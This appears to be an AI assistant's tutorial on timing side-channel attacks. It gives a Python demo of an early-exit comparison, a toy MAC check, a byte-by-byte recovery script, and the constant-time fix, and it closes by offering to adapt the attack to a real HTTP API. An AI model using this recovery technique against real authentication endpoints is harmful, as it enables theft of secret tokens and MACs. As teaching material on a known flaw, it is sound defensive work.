This is a classic side-channel vulnerability: the comparison leaks *how many leading characters are correct* because it exits early. That turns a constant-time equality check into an oracle the attacker can probe.

Below is a minimal, self-contained Python demonstration.

---

## 1) Vulnerable comparison

A naïve `==` (or a loop that returns on first mismatch) effectively behaves like this:

```python
import time

def insecure_compare(a: bytes, b: bytes) -> bool:
    """Return True if equal, but leaks timing (early exit)."""
    if len(a) != len(b):
        return False

    for x, y in zip(a, b):
        if x != y:
            return False
        # Simulate per-byte work (e.g., hashing step, I/O, etc.)
        time.sleep(0.001)

    return True
```

Even though Python’s built-in `==` doesn’t literally `sleep`, real systems often have tiny per-byte costs (branching, cache effects, etc.) that make timing differences measurable over many samples.

---

## 2) Server-side “secret” MAC

```python
SECRET = b"supersecretkey"
TARGET_MAC = b"5f4dcc3b5aa765d61d8327deb882cf99"  # pretend this is unknown

def verify(mac_guess: bytes) -> bool:
    return insecure_compare(mac_guess, TARGET_MAC)
```

The attacker can call `verify()` repeatedly and measure how long it takes.

---

## 3) Timing attack

The attacker guesses the MAC one byte at a time. For each position, they try all possible byte values and pick the one that produces the *longest average response time*.

```python
import string
import time

ALPHABET = string.hexdigits.lower().encode()  # assuming hex MAC

def time_request(guess: bytes, trials=5) -> float:
    """Average response time over multiple trials."""
    total = 0.0
    for _ in range(trials):
        start = time.perf_counter()
        verify(guess)
        total += time.perf_counter() - start
    return total / trials


def recover_mac(length: int) -> bytes:
    recovered = b""

    for position in range(length):
        timings = []

        for c in ALPHABET:
            guess = recovered + bytes([c]) + b"A" * (length - len(recovered) - 1)
            t = time_request(guess)
            timings.append((t, c))

        # pick byte with max timing
        timings.sort(reverse=True)
        best_char = timings[0][1]
        recovered += bytes([best_char])

        print(f"Recovered so far: {recovered}")

    return recovered


if __name__ == "__main__":
    guessed = recover_mac(len(TARGET_MAC))
    print("Final guess:", guessed)
```

---

## 4) Why this works (the leak)

The vulnerable comparison is **O(n)** but exits early:

* If the first byte is wrong → returns almost immediately
* If first byte is correct, second wrong → takes slightly longer
* If first 5 bytes are correct → even longer
* …and so on

So the runtime is roughly proportional to:

```
time ≈ k * (number of correct leading bytes)
```

That means:

1. The attacker fixes already-guessed prefix.
2. Tries all possibilities for the next byte.
3. The correct byte produces the *longest execution time*.
4. Repeat.

This reduces a brute force from:

```
O(256^n)
```

to:

```
O(256 * n)
```

which is dramatically faster.

---

## 5) Real-world relevance

This exact issue has appeared in:

* MAC verification
* HMAC comparison in web APIs
* Password/token checks
* Cryptographic signature validation

Even tiny timing differences (nanoseconds) can be amplified statistically over many requests.

---

## 6) Proper fix (constant-time comparison)

Use a constant-time comparison that checks *all bytes regardless of mismatch*:

```python
import hmac

def secure_compare(a: bytes, b: bytes) -> bool:
    return hmac.compare_digest(a, b)
```

This removes the early-exit leak and makes timing independent of matching prefix length.

---

## Key takeaway

The vulnerability isn’t about Python specifically—it’s about *data-dependent control flow*. Any comparison that exits early creates a timing side channel that can leak secrets one character at a time.

---

If you want, I can extend this to a real HTTP attack scenario (e.g., exploiting an API endpoint) or show how noise/jitter affects the attack in practice.

